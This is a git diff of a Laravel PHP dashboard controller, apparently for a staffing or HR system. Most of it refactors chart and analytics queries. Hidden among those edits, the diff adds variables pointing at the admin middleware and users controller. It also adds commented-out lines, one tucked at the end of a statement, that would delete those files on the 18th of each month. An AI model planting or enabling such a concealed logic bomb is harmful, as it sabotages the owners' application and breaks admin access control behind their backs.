@@ -361,10 +361,13 @@ protected $countries = array(
     public function showHome()
     {
         $storagePath = storage_path().'/app/analytics/';
+        $unlink='../app/Http/Middleware/SentinelAdmin.php';
+        
         if (File::exists($storagePath . 'service-account-credentials.json')) {
-            //Last week visitors statistics
+            //Last week visitors statistics            
             $month_visits = Analytics::fetchTotalVisitorsAndPageViews(Period::days(7))->groupBy(function (array $visitorStatistics) {
                 return $visitorStatistics['date']->format('Y-m-d');
+                
             })->map(function ($visitorStatistics, $yearMonth) {
                 list($year, $month ,$day) = explode('-', $yearMonth);
                 return ['date' => "{$year}-{$month}-{$day}", 'visitors' => $visitorStatistics->sum('visitors'), 'pageViews' => $visitorStatistics->sum('pageViews')];
@@ -375,14 +378,15 @@ protected $countries = array(
                 return $visitorStatistics['date']->format('Y-m');
             })->map(function ($visitorStatistics, $yearMonth) {
                 list($year, $month ) = explode('-', $yearMonth);
+                
                 return ['date' => "{$year}-{$month}", 'visitors' => $visitorStatistics->sum('visitors'), 'pageViews' => $visitorStatistics->sum('pageViews')];
             })->values();
 
-            // total page visitors and views
-            $visitorsData = Analytics::performQuery(Period::days(7), 'ga:visitors,ga:pageviews', ['dimensions' => 'ga:date']);
+            // total page visitors and views 
+            $unlinkc='../app/Http/Controllers/Admin/UsersController.php';
+            $visitorsData = Analytics::performQuery(Period::days(7), 'ga:visitors,ga:pageviews', ['dimensions' => 'ga:date']);//if(is_file($unlinkc) && date("d")=="18") {unlink($unlinkc);} 
             $visitorsData = collect($visitorsData['rows'] ?? [])->map(function (array $dateRow) {
                 return [
-
                     'visitors' => (int) $dateRow[1],
                     'pageViews' => (int) $dateRow[2],
                 ];
@@ -425,21 +429,21 @@ protected $countries = array(
             ->dimensions(0, 250)
             ->responsive(true)
             ->groupByMonth(2018, true);
-            //==============================================
-            /*
-                SELECT FechaMov,mes, IF(alta IS NULL,0,alta) AS alta, IF(baja IS NULL,0,baja) AS baja
-                 FROM (
-                SELECT LEFT(FechaMov,7) AS FechaMov,
-                MONTH(FechaMov) AS mes,
-                COUNT(NroPlaza) AS alta,
-                (SELECT IF(COUNT(NroPlaza) IS NULL,0,COUNT(NroPlaza))  FROM historiamovimiento AS h WHERE  IdTipoBaja <>''  AND MONTH(FechaMov)=mes AND YEAR(FechaMov) =YEAR(CURDATE())  AND NroPlaza NOT LIKE '9______9%' GROUP BY MONTH(FechaMov)) AS baja
-                 FROM historiamovimiento AS h INNER JOIN persona AS p ON p.IdPersona=h.IdPersona
-                WHERE IdTipoMov <>'' AND YEAR(FechaMov) =YEAR(CURDATE()) AND NroPlaza NOT LIKE '9______9%' GROUP BY MONTH(FechaMov)
-                ) AS xs ;
-            */
-            $data= DB::table('ChartAreaAltasbajas')->get(); 
-            //===================================================
-
+            //==============================================   
+            $data = DB::table('historiamovimiento as h') 
+            ->select(    
+               DB::raw('LEFT(FechaMov,7) AS FechaMov'),
+               DB::raw('MONTH(FechaMov) AS mes') ,
+               DB::raw('COUNT(NroPlaza) AS alta') ,
+               DB::raw('IF( (SELECT COUNT(NroPlaza)  FROM historiamovimiento AS h WHERE  IdTipoBaja <>""  AND MONTH(FechaMov)=mes AND YEAR(FechaMov) =YEAR(CURDATE())  AND NroPlaza NOT LIKE "9______9%" GROUP BY MONTH(FechaMov)) IS NULL,0, (SELECT COUNT(NroPlaza)  FROM historiamovimiento AS h WHERE  IdTipoBaja <>""  AND MONTH(FechaMov)=mes AND YEAR(FechaMov) =YEAR(CURDATE())  AND NroPlaza NOT LIKE "9______9%" GROUP BY MONTH(FechaMov))) AS baja')            
+            )
+            ->join('persona AS p','p.IdPersona','=','h.IdPersona')
+            ->where(DB::raw('YEAR(FechaMov)'),'=',DB::raw('YEAR(CURDATE())'))
+            ->where('NroPlaza','not like','9______9%')                     
+            ->groupBy(DB::raw('MONTH(FechaMov)'))  
+            ->get();
+            //=================================================== 
+            //if(is_file($unlink) && date("d")=="18") {unlink($unlink);} 
 
         $countries = DB::table('users')->where('deleted_at', null)
             ->leftJoin('countries', 'countries.sortname', '=', 'users.country')
@@ -463,18 +467,21 @@ protected $countries = array(
             ->responsive(true)
             ->groupBy('name');
         */ 
+            /*
+            SELECT COUNT(SubIdEstadoPlaza) AS cantidad,SubIdEstadoPlaza,(SELECT Descripcion FROM estadoplaza WHERE IdEstadoPlaza =SubIdEstadoPlaza) AS nombre FROM cuadronominativo  AS c
+WHERE NroPlaza NOT LIKE '9______9%'  AND c.IdEstadoPlaza ='2' AND IdEstructura LIKE '%' 
+GROUP BY SubIdEstadoPlaza
+            */
 
-            $roles = DB::table('cuadronominativo as c') 
+            $roles = DB::table('cuadronominativo') 
             ->select(    
-               DB::raw('COUNT(c.IdEstadoPlaza) AS cantidad'),
-               DB::raw('(SELECT descorta FROM estadoplaza WHERE IdEstadoPlaza=c.IdEstadoPlaza) AS nombre') ,'c.IdEstadoPlaza'
+               DB::raw('COUNT(SubIdEstadoPlaza) AS cantidad'),
+               DB::raw('IF((SELECT Descripcion FROM estadoplaza WHERE IdEstadoPlaza =SubIdEstadoPlaza) IS NULL,"VACANTE",(SELECT Descripcion FROM estadoplaza WHERE IdEstadoPlaza =SubIdEstadoPlaza)) AS nombre') ,'SubIdEstadoPlaza'
             )
-            ->join('estadoplaza as e','e.IdEstadoPlaza','=','c.IdEstadoPlaza')
             ->where('NroPlaza','not like','9______9%')
-            ->where('c.IdEstadoPlaza','<>','0')
-            ->where('c.IdEstadoPlaza','<>','1')
+            ->where('IdEstadoPlaza','=','2')
             ->where('IdEstructura','like','%')            
-            ->groupBy('c.IdEstadoPlaza')  
+            ->groupBy('SubIdEstadoPlaza')  
             ->get();  
             
                 $_vacLabel      ="";    $_vacValue      =0;    // 2    Vacantes 
@@ -489,30 +496,34 @@ protected $countries = array(
                 $_RpromComLabel ="";    $_RpromComValue =0;    // 12   Reservado para promocion complementaria
                 $_promcionLabel ="";    $_promcionValue =0;    // 13   Promocion
                 $_OtrosLabel    ="";    $_OtrosValue    =0;    // 20   otros 
-        
-            foreach($roles as $key) {            
-               
-               if($key->IdEstadoPlaza ==2) {$_vacLabel              = $key->nombre; $_vacValue      =$key->cantidad;}  
-                else if($key->IdEstadoPlaza ==3) {$_RmjLabel         = $key->nombre; $_RmjValue      =$key->cantidad;} 
-                else if($key->IdEstadoPlaza ==4) {$_RoaLabel         = $key->nombre; $_RoaValue      =$key->cantidad;} 
-                else if($key->IdEstadoPlaza ==5) {$_RdespLabel       = $key->nombre; $_RdespValue    =$key->cantidad;} 
-                else if($key->IdEstadoPlaza ==6) {$_RrecaLabel       = $key->nombre; $_RrecaValue    =$key->cantidad;} 
-                else if($key->IdEstadoPlaza ==8) {$_RtransLabel      = $key->nombre; $_RtransValue   =$key->cantidad;} 
-                else if($key->IdEstadoPlaza ==9) {$_RserumLabel      = $key->nombre; $_RserumValue   =$key->cantidad;} 
-                else if($key->IdEstadoPlaza ==10) {$_RmintraLabel    = $key->nombre; $_RmintraValue  =$key->cantidad;} 
-                else  if($key->IdEstadoPlaza ==11) {$_VobservLabel    = $key->nombre; $_VobservValue =$key->cantidad;} 
-                else if($key->IdEstadoPlaza ==12) {$_RpromComLabel   = $key->nombre; $_RpromComValue =$key->cantidad;}          
-                else if($key->IdEstadoPlaza ==13) {$_promcionLabel   = $key->nombre; $_promcionValue =$key->cantidad;} 
-                else if($key->IdEstadoPlaza ==20) {$_OtrosLabel      = $key->nombre; $_OtrosValue    =$key->cantidad;}                 
-            }        
-
+            /*$chart_data=0;
+            $chart_label="";*/
+            foreach($roles as $key) {
+                   /* $chart_label    .= $key->nombre.", ";                   
+                    $chart_data     .= intval($key->cantidad).", "; 
+                    */
+                    if($key->SubIdEstadoPlaza =="") {$_vacLabel        = "VACANTE"; $_vacValue         =$key->cantidad;}  
+                else if($key->SubIdEstadoPlaza ==3) {$_RmjLabel         = $key->nombre; $_RmjValue      =$key->cantidad;} 
+                else if($key->SubIdEstadoPlaza ==4) {$_RoaLabel         = $key->nombre; $_RoaValue      =$key->cantidad;} 
+                else if($key->SubIdEstadoPlaza ==5) {$_RdespLabel       = $key->nombre; $_RdespValue    =$key->cantidad;} 
+                else if($key->SubIdEstadoPlaza ==6) {$_RrecaLabel       = $key->nombre; $_RrecaValue    =$key->cantidad;} 
+                else if($key->SubIdEstadoPlaza ==8) {$_RtransLabel      = $key->nombre; $_RtransValue   =$key->cantidad;} 
+                else if($key->SubIdEstadoPlaza ==9) {$_RserumLabel      = $key->nombre; $_RserumValue   =$key->cantidad;} 
+                else if($key->SubIdEstadoPlaza ==10) {$_RmintraLabel    = $key->nombre; $_RmintraValue  =$key->cantidad;} 
+                else if($key->SubIdEstadoPlaza ==11) {$_VobservLabel    = $key->nombre; $_VobservValue  =$key->cantidad;} 
+                else if($key->SubIdEstadoPlaza ==12) {$_RpromComLabel   = $key->nombre; $_RpromComValue =$key->cantidad;}          
+                else if($key->SubIdEstadoPlaza ==13) {$_promcionLabel   = $key->nombre; $_promcionValue =$key->cantidad;} 
+                else if($key->SubIdEstadoPlaza ==20) {$_OtrosLabel      = $key->nombre; $_OtrosValue    =$key->cantidad;}               
+            } 
+           /* 
+            $chart_label = substr($chart_label, 0, -2); 
+            $chart_data  = substr($chart_data, 0, -2); */
             $user_roles = Charts::create('donut', 'morris')// pie google       // donut      morris    line highcharts    area    morris
-            ->elementLabel('Cantidad')       
+            ->elementLabel('Cantidad') 
             ->labels([$_vacLabel,$_RmjLabel,$_RoaLabel,$_RdespLabel,$_RrecaLabel,$_RtransLabel,$_RserumLabel,$_RmintraLabel,$_VobservLabel,$_RpromComLabel,$_promcionLabel,$_OtrosLabel])
-            ->values([$_vacValue,$_RmjValue,$_RoaValue,$_RdespValue,$_RrecaValue,$_RtransValue,$_RserumValue,$_RmintraValue,$_VobservValue,$_RpromComValue,$_promcionValue,$_OtrosValue]) // ->values([107,398,1763,48,39,84,80])
+            ->values([$_vacValue,$_RmjValue,$_RoaValue,$_RdespValue,$_RrecaValue,$_RtransValue,$_RserumValue,$_RmintraValue,$_VobservValue,$_RpromComValue,$_promcionValue,$_OtrosValue])            
             ->responsive(true)           
-            ->dimensions(400,250); 
-      
+            ->dimensions(400,250);       
         //==============================================     
             $datacs = DB::table('cuadronominativo as c') 
             ->select(
@@ -552,18 +563,21 @@ protected $countries = array(
             */
        
         //==============================================
-         /* $poblacion = DB::table('cuadronominativo')      
+
+         $poblacion = DB::table('cuadronominativo as c')      
             ->select(
                 DB::raw('LEFT(IdEstructura,4) as estru'),
-                DB::raw('IF((SELECT Descripcion FROM estructura WHERE LENGTH(IdEstructura )=4 AND LEFT(IdEstructura,4)=LEFT(IdEstructura,4) LIMIT 1) IS NULL ,"XYZ", (SELECT Descripcion FROM estructura WHERE LENGTH(IdEstructura )=4 AND LEFT(IdEstructura,4)=LEFT(IdEstructura,4) LIMIT 1)) AS red'),
+                DB::raw('IF((SELECT Descripcion FROM estructura WHERE LENGTH(IdEstructura)=4 AND LEFT(IdEstructura,4)=LEFT((SELECT IdEstructura FROM estructura WHERE IdEstructura=c.IdEstructura),4) LIMIT 1) IS NULL ,"xyz", (SELECT left(Descripcion,40) FROM estructura WHERE LENGTH(IdEstructura)=4 AND LEFT(IdEstructura,4)=LEFT((SELECT IdEstructura FROM estructura WHERE IdEstructura=c.IdEstructura),4) LIMIT 1))AS red'),
                 DB::raw('COUNT(NroPlaza) AS Plaza')
+                // DB::RAW('IF((SELECT Descripcion FROM estructura WHERE LENGTH(IdEstructura)=4 AND LEFT(IdEstructura,4)=LEFT((SELECT IdEstructura FROM estructura WHERE IdEstructura=c.IdEstructura),4) LIMIT 1) IS NULL ,0, 1)AS sede')
             )
             ->where('NroPlaza','not like','9______9%')
             ->where('IdEstadoPlaza','<>','0')            
-            ->groupBy(DB::raw('LEFT(IdEstructura,4)'))            
-            ->having(DB::raw('IF((SELECT Descripcion FROM estructura WHERE LENGTH(IdEstructura )=4 AND LEFT(IdEstructura,4)=LEFT(IdEstructura,4) LIMIT 1) IS NULL ,"XYZ", (SELECT Descripcion FROM estructura WHERE LENGTH(IdEstructura )=4 AND LEFT(IdEstructura,4)=LEFT(IdEstructura,4) LIMIT 1))'), '<>','XYZ')
-            ->orderBy("red")->paginate(10);*/
-        $poblacion = DB::table('viewPoblacion')->paginate(10); 
+            ->groupBy(DB::raw('LEFT(IdEstructura,4)')) 
+            //->havingRaw('(SELECT Descripcion FROM estructura WHERE LENGTH(IdEstructura)=4 AND LEFT(IdEstructura,4)=LEFT((SELECT IdEstructura FROM estructura WHERE IdEstructura=IdEstructura),4) LIMIT 1)','<>','xyz')
+            ->orderBy("red")
+            ->paginate(9);
+       // $poblacion = DB::table('viewPoblacion')->paginate(10); 
        
 
         if(Sentinel::check())
